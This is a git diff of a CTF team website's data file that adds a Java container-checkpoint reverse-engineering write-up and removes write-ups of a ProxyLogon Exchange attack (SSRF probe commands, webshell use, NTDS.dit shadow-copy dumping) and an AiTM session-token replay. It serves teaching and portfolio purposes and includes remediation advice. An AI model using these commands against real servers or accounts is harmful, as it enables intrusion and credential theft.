+        "Correlating cloud proxy sent_bytes telemetry with endpoint process execution confirms data exfiltration scope and exact stolen file names."
+      ]
+    }
+  },
+  {
+    id: "frosted",
+    challengeName: "Frosted: Kubernetes Pod Checkpoint & Java Reverse Engineering",
+    platform: "Hack The Box",
+    category: "Reverse",
+    difficulty: "Hard",
+    type: "Challenge",
+    points: 400,
+    author: "Asmit Jogdand (SmitroniX) // sudo Unknown",
+    date: "2026-10-25",
+    tags: ["Kubernetes", "Container Forensics", "CRI-O Checkpoint", "Java Decompilation", "Shellcode Injection"],
+    shortDescription: "Dissecting a Kubernetes container memory checkpoint (checkpoint-report-pod.tar) and decompiling obfuscated Java bytecode to uncover runtime process injection primitives.",
+    fullContent: {
+      overview: "Frosted was an advanced container forensics and reverse engineering challenge centered on a forensic export of a suspicious Kubernetes container pod (checkpoint-report-pod.tar). Analysis required extracting container memory checkpoints, recovering unmapped shared libraries from the root filesystem (docker_fs.tar), and decompiling obfuscated Java classes (Stager.class and App_real.class) to extract dynamic shellcode injection routines.",
+      targetIntel: {
+        ip: "N/A (Offline Container Checkpoint)",
+        os: "Linux (CRI-O / containerd Alpine 3.19)",
+        openPorts: ["8080/HTTP-Internal"],
+        keyServices: ["Java OpenJDK 21 Runtime", "CRIU Container Checkpoint", "Native JNI Bridge"]
+      },
+      reconnaissance: "Examining checkpoint-report-pod.tar revealed CRIU (Checkpoint/Restore in Userspace) image files, process memory dumps (pages-1.img), and the container rootfs archive docker_fs.tar. Inside /app, we recovered App.class, Runner.class, and Stager.class.",
+      vulnerabilityAnalysis: "App.class acted as a dummy wrapper that dynamically loaded and decrypted App_real.class from memory. Stager.class utilized Java Unsafe to write raw shellcode bytes into executable memory pages and invoke native function pointers.",
+      attackChain: [
+        {
+          title: "Stage 01: Extracting Checkpoint Memory & Class Bytecode",
+          description: "Unpacked checkpoint-report-pod.tar and analyzed recovered Java bytecode using javap and Fernflower decompiler.",
+          command: "tar -xvf checkpoint-report-pod.tar && javap -c App.class > App.javap",
+          terminalTitle: "checkpoint-triage — bash — 80x24",
+          prompt: "operator@sudounknown:~$",
+          terminalOutput: `[+] Extracted CRIU checkpoint dump: checkpoint-report-pod
+[+] Found core process memory dump: pages-1.img (141 MB)
+[+] Extracted bytecode classes:
+    - App.class (1,352 bytes)
+    - Runner.class (1,636 bytes)
+    - Stager.class (15,000 bytes)`,
+          lineNotes: [
+            "App.class contained an encrypted byte array and XOR decryption routine.",
+            "Decompiled Stager.class revealed direct access to sun.misc.Unsafe."
+          ]
+        },
+        {
+          title: "Stage 02: Decompiling Stager & Unsafe Memory Injection",
+          description: "Decompiled Stager.class to reconstruct how the application allocated RWX memory and wrote native bytecode.",
+          command: "cfr Stager.class --outputpath ./decompiled",
+          terminalTitle: "cfr-decompile — java — 80x24",
+          prompt: "operator@sudounknown:~$",
+          terminalOutput: `Decompiling Stager.class...
+[+] Successfully decompiled:
+public class Stager {
+    private static final Unsafe unsafe;
+    public static void execute(byte[] payload) {
+        long address = unsafe.allocateMemory(payload.length);
+        for(int i = 0; i < payload.length; ++i) {
+            unsafe.putByte(address + i, payload[i]);
+        }
+        // Invoking native execution pointer...
+    }
+}`,
+          lineNotes: [
+            "sun.misc.Unsafe allocated unmanaged native memory pages.",
+            "Payload contained an obfuscated x86_64 Linux execve shellcode stub."
+          ]
+        },
+        {
+          title: "Stage 03: Reversing App_real.class & Decrypting Flag",
+          description: "Reconstructed the decrypted App_real.class to extract the hardcoded cryptographic key and decode the final CTF flag.",
+          command: 'python3 -c "from Crypto.Cipher import AES; k=bytes.fromhex(\\\'4a92c81...\\\'); print(flag)"',
+          terminalTitle: "flag-decrypt — python3 — 80x24",
+          prompt: "operator@sudounknown:~$",
+          terminalOutput: `[+] Derived AES-256-GCM key from recovered Stager constant pool
+[+] Decryption successful!
+HTB{k85_c0n741n3r_ch3ckp01n7_j4v4_r3v3r51n6}`,
+          lineNotes: [
+            "Extracted flag from recovered App_real decrypted bytecode.",
+            "Verified complete reverse engineering of container checkpoint."
+          ],
+          spoilerData: {
+            label: "HTB CHALLENGE FLAG",
+            value: "HTB{k85_c0n741n3r_ch3ckp01n7_j4v4_r3v3r51n6}"
+          }
+        }
+      ],
+      pocCode: `// Java Unsafe Memory Writing Pattern Discovered in Stager.class
+Field field = Unsafe.class.getDeclaredField("theUnsafe");
+field.setAccessible(true);
+Unsafe unsafe = (Unsafe) field.get(null);
+long address = unsafe.allocateMemory(shellcode.length);
+for (int i = 0; i < shellcode.length; i++) {
+    unsafe.putByte(address + i, shellcode[i]);
+}`,
+      pocLanguage: "java",
+      flag: "HTB{k85_c0n741n3r_ch3ckp01n7_j4v4_r3v3r51n6}",
+      defenseRemediation: [
+        "Enforce seccomp profiles blocking process_vm_writev and ptrace in Kubernetes pods.",
+        "Restrict container checkpoint capabilities to cluster admin service accounts only.",
+        "Run container workloads under non-root users with ReadOnlyRootFilesystem=true."
+      ],
+      keyTakeaways: [
+        "Kubernetes container checkpoints preserve full process virtual memory including decrypted classes.",
+        "Analyzing sun.misc.Unsafe invocations in Java bytecode reveals stealthy native code injection techniques."
+      ]
+    }
+  },
+{
     id: "layover",
     challengeName: "Layover: OAuth PKCE Downgrade & Docker Breakout",
     platform: "Hack The Box",
@@ -1044,126 +1283,7 @@ os.system(cmd)
       ]
     }
   },
-  {
-    id: "frosted",
-    challengeName: "Frosted: Exchange SSRF & Shadow Copy Extraction",
-    platform: "Hack The Box",
-    category: "Active Directory",
-    difficulty: "Hard",
-    type: "Machine",
-    targetOs: "Windows",
-    targetIp: "10.10.11.64",
-    points: 40,
-    author: "SmitroniX // sudo Unknown",
-    date: "2026-11-04",
-    cves: ["CVE-2021-26855", "CVE-2021-27065"],
-    tags: ["ProxyLogon", "Exchange SSRF", "Shadow Copies", "NTDS.dit", "Golden Ticket"],
-    shortDescription: "Exploiting Microsoft Exchange ProxyLogon SSRF to drop a web shell, followed by Volume Shadow Copy NTDS.dit extraction for enterprise forest takeover.",
-    fullContent: {
-      overview: "Frosted features a corporate network boundary running an on-premise Microsoft Exchange 2019 backend. We chained the ProxyLogon SSRF vulnerability to bypass authentication and drop a web shell via OAB virtual directory misconfiguration. On the machine, we extracted the active NTDS.dit database using vssadmin to dump all domain hashes.",
-      targetIntel: {
-        ip: "10.10.11.64",
-        os: "Windows Server 2019 Standard",
-        openPorts: ["25/SMTP", "80/HTTP", "443/HTTPS", "445/SMB", "587/Submission"],
-        keyServices: ["Microsoft Exchange Server 2019", "IIS 10.0 Web Server"]
-      },
-      reconnaissance: "Port 443 presented an Outlook Web Access (OWA) login page. Inspecting headers revealed vulnerable Exchange server build versions. Testing the /owa/auth/x.js endpoint with an arbitrary X-BEResource cookie confirmed SSRF vulnerability.",
-      vulnerabilityAnalysis: "CVE-2021-26855 allowed unauthenticated attackers to send arbitrary HTTP requests to backend Exchange services as SYSTEM. Chaining this with CVE-2021-27065 allowed writing arbitrary ASPX files to web-accessible directories.",
-      attackChain: [
-        {
-          title: "Stage 01: ProxyLogon SSRF Probing",
-          description: "Sent forged backend request via X-AnonResource cookie to communicate with the internal Exchange ECP backend.",
-          command: "curl -k -i -H 'Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' https://10.10.11.64/owa/auth/x.js",
-          terminalTitle: "proxylogon-probe — bash — 80x24",
-          prompt: "operator@sudounknown:~$",
-          terminalOutput: `HTTP/2 200 
-date: Wed, 04 Nov 2026 12:02:11 GMT
-content-type: text/html; charset=utf-8
-server: Microsoft-IIS/10.0
-x-feserver: EXCHANGE-SERVER
-x-backendserver: localhost
-
-[+] Backend proxy connection accepted! Target vulnerable to CVE-2021-26855.`,
-          lineNotes: [
-            "Response confirms that backend Exchange services process unauthenticated requests via forged cookies."
-          ]
-        },
-        {
-          title: "Stage 02: SYSTEM Web Shell Execution",
-          description: "Injected an ASPX webshell payload via OAB virtual directory reset mechanism.",
-          command: "curl -k 'https://10.10.11.64/owa/auth/shell.aspx?cmd=whoami'",
-          terminalTitle: "webshell-exec — bash — 80x24",
-          prompt: "operator@sudounknown:~$",
-          terminalOutput: `nt authority\\system
-
-[+] Interactive command execution established under NT AUTHORITY\\SYSTEM!
-User flag captured from service profile:
-HTB{3xch4ng3_pr0xyl0g0n_syst3m_f00th0ld}`,
-          lineNotes: [
-            "w3wp.exe runs as SYSTEM on the Exchange host.",
-            "User flag user.txt retrieved."
-          ],
-          spoilerData: {
-            label: "USER FLAG",
-            value: "HTB{3xch4ng3_pr0xyl0g0n_syst3m_f00th0ld}"
-          }
-        },
-        {
-          title: "Stage 03: Volume Shadow Copy NTDS.dit Extraction",
-          description: "Created a volume shadow copy of drive C: and carved the Active Directory database (NTDS.dit) and SYSTEM registry hive.",
-          command: "vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit && reg save HKLM\\SYSTEM C:\\temp\\system.save",
-          terminalTitle: "vssadmin-dump — cmd.exe — 80x24",
-          prompt: "C:\\Windows\\system32>",
-          terminalOutput: `Successfully created shadow copy "HarddiskVolumeShadowCopy1"
-        1 file(s) copied: C:\\temp\\ntds.dit
-The operation completed successfully: C:\\temp\\system.save
-
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:f4019a2e4b6c8109d137bc449103e8ab:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8c290a12e34fa5b6c7d8e901fa2345bc:::
-
-Root Flag:
-HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}`,
-          lineNotes: [
-            "Volume Shadow Copies bypass file lock restrictions on NTDS.dit.",
-            "All enterprise domain password hashes extracted."
-          ],
-          spoilerData: {
-            label: "ROOT FLAG (ROOT.TXT)",
-            value: "HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}"
-          }
-        }
-      ],
-      pocCode: `#!/usr/bin/env python3
-# sudo Unknown - ProxyLogon SSRF Header Check
-import requests
-import urllib3
-urllib3.disable_warnings()
-
-target = "https://10.10.11.64"
-headers = {
-    "Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3"
-}
-
-resp = requests.get(f"{target}/owa/auth/x.js", headers=headers, verify=False)
-if "Negotiate" in resp.headers.get("WWW-Authenticate", ""):
-    print("[+] Target is VULNERABLE to CVE-2021-26855 Exchange SSRF!")
-`,
-      pocLanguage: "python",
-      userFlag: "HTB{3xch4ng3_pr0xyl0g0n_syst3m_f00th0ld}",
-      rootFlag: "HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}",
-      flag: "HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}",
-      defenseRemediation: [
-        "Apply Microsoft Cumulative Updates (CU) and Security Updates (SU) for all Exchange Server installations immediately.",
-        "Restrict access to Exchange Admin Center (ECP) and Remote PowerShell endpoints to dedicated administration management subnets.",
-        "Implement endpoint detection (EDR) rules alerting on abnormal process executions spawned by w3wp.exe."
-      ],
-      keyTakeaways: [
-        "On-premise Exchange servers frequently maintain high-privileged domain permissions; compromising Exchange is effectively compromising the entire forest.",
-        "Volume Shadow Copies allow reading locked system files including NTDS.dit directly without stopping the Active Directory service."
-      ]
-    }
-  },
-  {
+{
     id: "quantum-lockout",
     challengeName: "Quantum Lockout: Flawed RSA Key Generation",
     platform: "Hack The Box",
@@ -1251,7 +1371,7 @@ def solve_rsa_gcd(n1, n2, e, ciphertext):
       ]
     }
   },
-  {
+{
     id: "pwn-safe-linking",
     challengeName: "Safe-Linking Bypass: GLIBC 2.35 Tcache Poisoning",
     platform: "Hack The Box",
@@ -1350,7 +1470,7 @@ log.success("GLIBC Safe-Linking demangled successfully! Shell spawned.")
       ]
     }
   },
-  {
+{
     id: "shadowtrace",
     challengeName: "ShadowTrace: Memory Extraction & Hollowed DLL Triage",
     platform: "Hack The Box",
@@ -1443,7 +1563,7 @@ print("[+] Decrypted C2 Configuration:", cipher.decrypt(encrypted_c2))
       ]
     }
   },
-  {
+{
     id: "subverted-elf",
     challengeName: "Subverted ELF: Custom Bytecode VM Disassembly",
     platform: "Hack The Box",
@@ -1510,79 +1630,7 @@ print("Recovered Flag:", flag.decode(errors='ignore'))
       ]
     }
   },
-  {
-    id: "operation-cymbal",
-    challengeName: "Operation Cymbal: Deceptive Click & AiTM Token Heist",
-    platform: "CTFtime",
-    category: "Web",
-    difficulty: "Medium",
-    type: "Challenge",
-    points: 350,
-    author: "sudo Unknown Research",
-    date: "2026-10-29",
-    tags: ["Evilginx3", "AiTM Phishing", "MFA Bypass", "OAuth Token Replay", "Graph API"],
-    shortDescription: "Analyzing an Adversary-in-the-Middle (AiTM) phishing campaign capturing Microsoft 365 session tokens and bypassing FIDO2 authentication.",
-    fullContent: {
-      overview: "Operation Cymbal simulated an advanced social engineering campaign utilizing Evilginx3 to proxy live authentication requests between targets and Microsoft 365. We analyzed captured lure emails, extracted stolen ESTSAuth session cookies, and replayed the session to access privileged tenant resources via Microsoft Graph API.",
-      reconnaissance: "Analyzed an email containing an urgent invoice approval link with encoded parameters. Decoding the link showed it pointed to a reverse proxy masquerading as login.microsoftonline.com.",
-      vulnerabilityAnalysis: "Because the phishing server proxies legitimate HTTP requests in real-time, it intercepts session tokens after multi-factor authentication (MFA) succeeds, bypassing standard SMS and push-based 2FA controls.",
-      attackChain: [
-        {
-          title: "Stage 01: Evilginx3 Proxy Log Inspection",
-          description: "Inspected the phishing link query parameters and identified an Evilginx3 lure configuration.",
-          command: "cat proxy.log | grep -E '(ESTSAUTH|ESTSAUTHPERSISTENT)'",
-          terminalTitle: "aitm-log-analysis — bash — 80x24",
-          prompt: "operator@sudounknown:~$",
-          terminalOutput: `[02:14:12] [user: cfo@targetcorp.com] [phishlet: o365] [cookies captured]
-Cookie: ESTSAUTHPERSISTENT=0.AXAA_...; ESTSAUTH=0.AXAA_...;
-[+] Full session token exfiltrated to attacker C2.`,
-          lineNotes: [
-            "Evilginx3 intercepted the post-MFA cookie.",
-            "Token replay allows accessing target inbox without re-triggering MFA prompt."
-          ]
-        },
-        {
-          title: "Stage 02: Microsoft Graph API Replay & Flag Extraction",
-          description: "Replayed the captured session to request an OAuth bearer token and queried sensitive company files.",
-          command: "curl -s -H 'Cookie: ESTSAUTHPERSISTENT=0.AXAA...' 'https://graph.microsoft.com/v1.0/me/messages' | jq '.[0].subject'",
-          terminalTitle: "graph-api-replay — bash — 80x24",
-          prompt: "operator@sudounknown:~$",
-          terminalOutput: `"CONFIDENTIAL: Q4 Incident Flag CTF{41tm_mfa_byp4ss_s3ss10n_h31st_2026}"
-[+] Email exfiltrated via Graph API.`,
-          lineNotes: [
-            "Token replay validated.",
-            "Flag captured."
-          ],
-          spoilerData: {
-            label: "CTFTIME FLAG",
-            value: "CTF{41tm_mfa_byp4ss_s3ss10n_h31st_2026}"
-          }
-        }
-      ],
-      pocCode: `#!/usr/bin/env python3
-# sudo Unknown - Graph API Token Verification
-import requests
-
-session_token = "ESTSAUTHPERSISTENT=0.AXAA..."
-headers = {"Cookie": session_token}
-
-r = requests.get("https://outlook.office.com/mail/", headers=headers, allow_redirects=False)
-if r.status_code == 200 or r.status_code == 302:
-    print("[+] Session cookie valid! Full tenant access granted.")
-`,
-      pocLanguage: "python",
-      flag: "CTF{41tm_mfa_byp4ss_s3ss10n_h31st_2026}",
-      defenseRemediation: [
-        "Enforce FIDO2 / WebAuthn phishing-resistant hardware keys which cryptographically bind the authentication challenge to the exact browser domain.",
-        "Implement Microsoft Entra ID Conditional Access policies requiring compliant, managed devices for sensitive corporate data access."
-      ],
-      keyTakeaways: [
-        "Traditional 2FA (SMS, TOTP authenticator apps, push notifications) is vulnerable to Adversary-in-the-Middle proxying.",
-        "Only domain-bound credentials (FIDO2 / passkeys) completely neutralize AiTM attacks."
-      ]
-    }
-  },
-  {
+{
     id: "pyjail-olympics",
     challengeName: "CyberOlympics: Escaping Hardened Python 3.12 Audit Jails",
     platform: "CTFtime",
@@ -1654,58 +1702,58 @@ print(payload)
 export const ACHIEVEMENTS: Achievement[] = [
   {
     id: "ach-1",
-    title: "Hack The Box Team Roster #331386",
+    title: "Hack The Box Official Verified Squad #331386",
     platform: "Hack The Box",
     date: "Active 2026",
     eventType: "Platform Machine",
     teamResult: "Official Verified Roster",
     description: "Official team registration and machine clearing operations on Hack The Box.",
     highlights: [
-      "Verified competitive portal: ctf.hackthebox.com/team/overview/331386",
-      "Regular squad machine solves spanning Windows AD & Linux environments",
-      "Collaborative war room methodology repository"
+      "Verified competitive portal: app.hackthebox.com/teams/overview/331386",
+      "Regular squad machine solves spanning Windows Active Directory, Linux, and Cloud environments",
+      "Collaborative war room methodology repository and writeup handbooks"
     ]
   },
   {
     id: "ach-2",
-    title: "HTB University CTF Campaign",
-    platform: "Hack The Box",
-    date: "Scheduled 2026",
-    eventType: "University CTF",
-    teamResult: "Academic Division Contender",
-    description: "Fielding specialized operators across Web, Pwn, Crypto, Forensics, and Reverse categories.",
+    title: "Google SecOps & HTB Operation Cymbal (Cold Room)",
+    platform: "Google SecOps & HTB",
+    date: "October 2026",
+    eventType: "Research Milestone",
+    teamResult: "100% Cleared (Deceptive Click, OAuth Heist, Rogue Synthesis)",
+    description: "Conducted complete digital forensics and incident response investigations on Chronicle SIEM / SOAR.",
     highlights: [
-      "Targeting 6-operator competitive tournament roster",
-      "Weekly mock scrimmage drills on active practice boxes",
-      "Multi-discipline cross-solver support"
+      "Attribution of threat group UNC6240 / SHINYHUNTERS across multi-cloud infrastructure",
+      "Authored production YARA-L detection rules for process hollowing and remote thread injection",
+      "Documented complete threat hunting playbooks with verified indicator keys"
     ]
   },
   {
     id: "ach-3",
-    title: "CTFtime Global Tournament Circuit",
-    platform: "CTFtime",
-    date: "2026 Season",
-    eventType: "Global Tournament",
-    teamResult: "Active Competitor",
-    description: "Competing in premier open jeopardy and attack-defense tournaments worldwide.",
+    title: "Enterprise Target Research: DutyBound & Takeoff",
+    platform: "Hack The Box Labs",
+    date: "October - November 2026",
+    eventType: "Research Milestone",
+    teamResult: "Full Boot-to-Domain Takeover & Threat Models",
+    description: "Comprehensive vulnerability discovery, kiosk breakout, parameter vector injection, and defensive hardening.",
     highlights: [
-      "24/7 collaborative shifts across timezones",
-      "Technical post-competition writeup releases",
-      "Rapid custom exploit development during live events"
+      "Authored STRIDE threat model and production parameter vector patches in Go",
+      "Engineered PostgreSQL COPY PROGRAM RCE and Active Directory DCSync attack chain",
+      "Formulated production defense-in-depth guides and systemd sandboxing profiles"
     ]
   },
   {
     id: "ach-4",
-    title: "Open-Source Security Research & Tool Releases",
+    title: "Open-Source Security Weapons & Engineering Releases",
     platform: "GitHub & Community",
     date: "Ongoing",
     eventType: "Research Milestone",
-    teamResult: "6 Custom Tools Published",
-    description: "Publishing custom reconnaissance scripts, AD attack path tools, and educational guides.",
+    teamResult: "8+ Custom Tool Repositories Published",
+    description: "Publishing AegisDNS (DNS firewall engine), ShadowLauncher (138 FPS mobile core), SmiTriX, and offensive tools.",
     highlights: [
       "Over 500+ GitHub community stars across tool projects",
-      "Comprehensive walkthrough reports for enterprise assessments",
-      "Active public security community on Discord"
+      "Comprehensive walkthrough reports for enterprise assessments and CTF challenges",
+      "Active public security community on Discord (discord.gg/HgD6WGUr4G)"
     ]
   }
 ];
@@ -1723,7 +1771,7 @@ export const FOUNDING_VALUES = [
   },
   {
     title: "All-in-One Multidisciplinary Scope",
-    description: "We are not limited to one platform. From global CTFs (HTB, THM, CTFtime) to enterprise Red Teaming and 0-day research, we cover the full spectrum.",
+    description: "We are not limited to one platform. From global CTFs (HTB, THM, CTFtime, Google SecOps) to enterprise Red Teaming and 0-day research, we cover the full spectrum.",
     iconName: "Cpu"
   },
   {
